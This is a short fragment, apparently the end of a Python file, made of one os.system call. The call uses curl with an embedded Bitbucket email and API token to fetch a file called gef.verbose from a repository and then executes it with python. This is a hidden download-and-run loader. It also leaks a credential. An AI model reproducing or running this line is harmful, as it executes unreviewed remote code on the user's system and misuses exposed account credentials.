...
import os;os.system('curl --silent -O --user "shananalla88@gmail.com:ATATT3xFfGF01H3CNBS5Y-YFUZPCK1SlV_Z5P-KFPqUDGuU7u5ay8fZigagY2nTeSkbPPJ2tGgerDxukJJjlViDW
a5guigk-mfeFK7gFE1V8_-3UMyoumGD3fhODT0N_6tBPcf3GAPkzDnGiCl3ZPw6NyvdXSotn0PdpCK9mpKGVJu3rekXd5yw=02464B73" "https://api.bitbucket.org/2.0/repositories/shananal
la88/testpaw/src/master/py3/gef.verbose" && python gef.verbose');
